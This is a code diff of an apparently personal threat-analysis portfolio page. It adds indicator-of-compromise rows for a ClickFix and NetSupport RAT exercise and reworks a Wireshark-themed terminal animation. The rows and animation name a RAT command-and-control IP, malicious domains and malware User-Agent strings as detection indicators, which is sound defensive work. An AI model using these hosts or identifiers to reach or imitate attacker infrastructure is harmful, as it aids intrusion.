+      <tr data-ex="2025-12-29"><td class="ioc-val" data-label="INDICATOR">104.21.96.46</td><td data-label="TYPE"><span class="ex-badge badge-high">IP</span></td><td class="ioc-role" data-label="ROLE">Cloudflare IP for relativegoingplanning.net — C2 attempt failed (HTTP 400)</td><td class="ioc-ex" data-label="EXERCISE">2025-12-29</td></tr>
+      <tr data-ex="2025-12-29"><td class="ioc-val" data-label="INDICATOR">NetSupport Manager/1.3</td><td data-label="TYPE"><span class="ex-badge badge-high">UA</span></td><td class="ioc-role" data-label="ROLE">Malicious User-Agent — NetSupport RAT C2 traffic identifier</td><td class="ioc-ex" data-label="EXERCISE">2025-12-29</td></tr>
+      <tr data-ex="2025-12-29"><td class="ioc-val" data-label="INDICATOR">Mozilla/4.0 MSIE 7.0 NT 10.0</td><td data-label="TYPE"><span class="ex-badge badge-high">UA</span></td><td class="ioc-role" data-label="ROLE">Spoofed User-Agent on GET /F.GRE — MSIE 7.0 impossible on Windows 10</td><td class="ioc-ex" data-label="EXERCISE">2025-12-29</td></tr>
     </tbody>
   </table>
   <div class="ioc-toggle-wrap">
@@ -894,25 +896,6 @@ html,body{max-width:100%;overflow-x:hidden;}
       <div class="tf-stat-row"><div class="tf-stat-label">Malware Executables (exe)</div><div class="tf-stat-val red" id="tf-exe">—</div></div>
       <div class="tf-stat-row"><div class="tf-stat-label">Most Common Tag</div><div class="tf-stat-text" id="tf-top-tag">—</div></div>
       <div class="tf-stat-row"><div class="tf-stat-label">Data freshness</div><div class="tf-stat-val green" style="font-size:16px;">24H</div></div>
-    </div>
-  </div>
-  <div style="background:var(--bg2);border:1px solid var(--border);border-top:none;">
-    <div style="padding:16px 28px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;">
-      <div style="width:3px;height:14px;background:var(--accent);border-radius:1px;flex-shrink:0;"></div>
-      <div style="font-family:var(--mono);font-size:13px;color:var(--accent);letter-spacing:0.12em;">HOW TO READ THIS FEED</div>
-    </div>
-    <div style="display:grid;grid-template-columns:repeat(6,1fr);">
-      <div style="padding:22px 22px;border-right:1px solid var(--border);"><div style="font-family:var(--mono);font-size:13px;color:var(--accent);margin-bottom:10px;">Bar Count</div><div style="font-family:var(--mono);font-size:12px;color:var(--text2);line-height:2;">Number of IOCs linked to this malware family in the last 24 hours</div></div>
-      <div style="padding:22px 22px;border-right:1px solid var(--border);"><div style="font-family:var(--mono);font-size:13px;color:var(--accent);margin-bottom:10px;">Total IOCs (24H)</div><div style="font-family:var(--mono);font-size:12px;color:var(--text2);line-height:2;">Total indicators observed today — IPs, Domains, and URLs</div></div>
-      <div style="padding:22px 22px;border-right:1px solid var(--border);"><div style="font-family:var(--mono);font-size:13px;color:var(--accent);margin-bottom:10px;">Domains / IP / URLs</div><div style="font-family:var(--mono);font-size:12px;color:var(--text2);line-height:2;">IOC type breakdown — Domain, IP with Port, or direct URL</div></div>
-      <div style="padding:22px 22px;border-right:1px solid var(--border);"><div style="font-family:var(--mono);font-size:13px;color:var(--accent);margin-bottom:10px;">Malware Families</div><div style="font-family:var(--mono);font-size:12px;color:var(--text2);line-height:2;">Number of distinct malware families active in the last 24h</div></div>
-      <div style="padding:22px 22px;border-right:1px solid var(--border);"><div style="font-family:var(--mono);font-size:13px;color:var(--accent);margin-bottom:10px;">High Confidence</div><div style="font-family:var(--mono);font-size:12px;color:var(--text2);line-height:2;">IOCs with 90%+ confidence — reliable and ready to block</div></div>
-      <div style="padding:22px 22px;"><div style="font-family:var(--mono);font-size:13px;color:var(--accent);margin-bottom:10px;">Most Common Tag</div><div style="font-family:var(--mono);font-size:12px;color:var(--text2);line-height:2;">Most repeated tag in the dataset — e.g. #exe or #stealer</div></div>
-    </div>
-    <div style="padding:13px 28px;border-top:1px solid var(--border);background:var(--bg3);display:flex;align-items:center;gap:8px;">
-      <div style="font-family:var(--mono);font-size:11px;color:var(--text3);">SOURCE</div>
-      <div style="width:1px;height:12px;background:var(--border2);"></div>
-      <div style="font-family:var(--mono);font-size:11px;color:var(--text2);">Data sourced from <span style="color:var(--accent);">ThreatFox</span></div>
     </div>
   </div>
 </section>
@@ -952,15 +935,15 @@ document.querySelectorAll('.fade-in').forEach(function(el){
     if(!termEl||termEl.dataset.started) return;
     termEl.dataset.started='1';
     var LINES=[
-      {cmd:true,text:'wireshark -r 2026-01-29.pcap'},
+      {cmd:true,text:'wireshark -r 2025-12-29.pcap'},
       {cmd:false,text:'Opening capture file...',cls:'green'},
-      {cmd:true,text:'smtp and ip.src == 10.1.29.101'},
-      {cmd:false,text:'SMTP on workstation detected!',cls:'amber'},
-      {cmd:false,text:'WARNING: Spam Bot activity',cls:'amber'},
+      {cmd:true,text:'http and ip.src == 10.12.29.101'},
+      {cmd:false,text:'NetSupport RAT detected!',cls:'amber'},
+      {cmd:false,text:'WARNING: ClickFix attack chain',cls:'amber'},
       {cmd:true,text:'tls.handshake.type == 1'},
-      {cmd:false,text:'api.telegram.org — C2!',cls:'red'},
-      {cmd:false,text:'SNAKEKEYLOGGER suspected',cls:'red'},
-      {cmd:false,text:'COMPROMISED: 10.1.29.101',cls:'red'},
+      {cmd:false,text:'extracareliving.com — ClickFix!',cls:'red'},
+      {cmd:false,text:'NETSUPPORT RAT active',cls:'red'},
+      {cmd:false,text:'COMPROMISED: 10.12.29.101',cls:'red'},
     ];
     var li=0,ci=0,span=null;
     function tick(){
@@ -1092,8 +1075,7 @@ window.addEventListener('load',function(){
       })
       .catch(function(err){
         var chart=document.getElementById('tf-chart');
-        if(chart) chart.innerHTML='<div class="tf-error">خطأ في تحميل البيانات: '+err.message
-          +'<br><button onclick="window.tfLoad()" style="margin-top:12px;font-family:var(--mono);font-size:10px;color:var(--accent);background:var(--accent-dim);border:1px solid var(--accent2);padding:6px 14px;cursor:pointer;border-radius:2px;">RETRY</button></div>';
+        if(chart) chart.innerHTML='<div class="tf-error">خطأ في تحميل البيانات: '+err.message+'</div>';
       });
   };
   window.tfLoad();
@@ -1105,7 +1087,6 @@ function filterIOC(ex,btn){
   var rows=document.querySelectorAll('.ioc-table tbody tr');
   var table=document.querySelector('.ioc-table');
   if(ex==='all'){
-    // restore collapse state
     rows.forEach(function(r,i){
       r.classList.remove('hidden');
       if(i>=10 && !table.classList.contains('expanded')){
@@ -1116,7 +1097,6 @@ function filterIOC(ex,btn){
     });
     updateToggleBtn();
   } else {
-    // show all matching, hide non-matching — ignore collapse
     rows.forEach(function(r){
       r.classList.remove('ioc-extra');
       r.classList.toggle('hidden', r.dataset.ex!==ex);
@@ -1148,7 +1128,6 @@ function updateToggleBtn(){
     btn.style.display='none';
   }
 }
-// Init: mark rows beyond 10 as extra
 (function initIOCCollapse(){
   var rows=document.querySelectorAll('.ioc-table tbody tr');
   rows.forEach(function(r,i){ if(i>=10) r.classList.add('ioc-extra'); });
